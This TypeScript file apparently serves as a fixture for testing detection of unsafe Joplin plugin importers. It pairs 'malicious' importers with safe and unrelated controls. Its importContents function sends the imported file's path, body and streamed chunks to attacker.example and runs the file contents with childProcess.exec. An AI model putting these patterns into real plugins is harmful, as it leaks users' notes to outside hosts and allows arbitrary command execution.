import * as childProcess from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import * as joplin from 'api';

const importContents = async (context: any) => {
    fetch('https://attacker.example/import-path?' + context.sourcePath);

    const contents = fs.readFileSync(context.sourcePath);
    fetch('https://attacker.example/import-body', {
        method: 'POST',
        body: contents,
    });

    childProcess.exec(String(contents));
    fs.writeFileSync('/tmp/import-copy.md', contents);
    fs.copyFileSync(context.sourcePath, '/tmp/original-import.md');

    fs.createReadStream(context.sourcePath).on('data', (chunk) => {
        fetch('https://attacker.example/import-stream', {
            method: 'POST',
            body: chunk,
        });
    });
};

const makeImporter = () => ({
    format: 'md',
    description: 'Import MD',
    isNoteArchive: false,
    sources: [],
    onExec: importContents,
});

class ClassImporter {
    format = 'txt';
    description = 'Import TXT';
    isNoteArchive = false;
    sources = [];

    async onExec(context: any) {
        const contents = await fs.promises.readFile(context.sourcePath);
        childProcess.execFile('node', ['processor.js', String(contents)]);
    }
}

async function registerMaliciousImports() {
    await joplin.interop.registerImportModule(makeImporter());
    await joplin.interop.registerImportModule(new ClassImporter());
}

async function registerSafeImport() {
    await joplin.interop.registerImportModule({
        format: 'json',
        description: 'Safe JSON import',
        isNoteArchive: false,
        sources: [],
        async onExec(context: any) {
            const contents = fs.readFileSync(context.sourcePath, 'utf8');
            const parsed = JSON.parse(contents);
            await joplin.data.post(['notes'], null, { title: parsed.title, body: parsed.body });

            const dataDir = await joplin.plugins.dataDir();
            fs.writeFileSync(path.join(dataDir, 'import-copy.json'), contents);
            fs.copyFileSync(context.sourcePath, path.join(dataDir, 'original-import.json'));

            fetch('https://example.com/import-option?' + context.options.mode);
            fetch('https://example.com/import-warning?' + context.warnings.join(','));
        },
    });
}

const readFile = (_path: string) => 'constant result';

async function registerUnrelatedReadFunction() {
    await joplin.interop.registerImportModule({
        format: 'custom',
        description: 'Custom import',
        isNoteArchive: false,
        sources: [],
        async onExec(context: any) {
            const unrelated = readFile(context.sourcePath);
            fetch('https://example.com/constant?' + unrelated);
        },
    });
}
